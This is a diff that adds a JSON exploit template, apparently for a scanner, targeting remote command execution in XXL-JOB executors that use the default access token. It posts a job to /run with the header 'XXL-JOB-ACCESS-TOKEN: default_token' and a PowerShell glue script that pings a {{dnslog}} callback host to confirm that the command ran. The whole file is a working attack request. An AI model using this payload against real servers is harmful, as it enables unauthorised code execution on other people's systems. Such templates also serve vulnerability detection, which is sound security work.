@@ -1,0 +1,26 @@
+{
+	"name":"xxl-job默认accessToken命令执行",
+	"tag":"xxl-job",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/run",
+		"pocPost":"{\r\n  \"jobId\": 1,\r\n  \"executorHandler\": \"demoJobHandler\",\r\n  \"executorParams\": \"demoJobHandler\",\r\n  \"executorBlockStrategy\": \"SERIAL_EXECUTION\",\r\n  \"executorTimeout\": 0,\r\n  \"logId\": 1,\r\n  \"logDateTime\": 1586629003729,\r\n  \"glueType\": \"GLUE_POWERSHELL\",\r\n  \"glueSource\": \"ping -nc 1 {{dnslog}}\",\r\n  \"glueUpdatetime\": 1586699003758,\r\n  \"broadcastIndex\": 0,\r\n  \"broadcastTotal\": 0\r\n}",
+		"header":{
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv",
+			"Connection":" close",
+			"Sec-Fetch-Dest":" document",
+			"Sec-Fetch-Site":" none",
+			"Accept-Encoding":" gzip, deflate",
+			"DNT":" 1",
+			"XXL-JOB-ACCESS-TOKEN":" default_token",
+			"Sec-Fetch-Mode":" navigate",
+			"Upgrade-Insecure-Requests":" 1",
+			"Sec-Fetch-User":" ?1",
+			"Accept-Language":" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+			"Content-Length":" 365"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
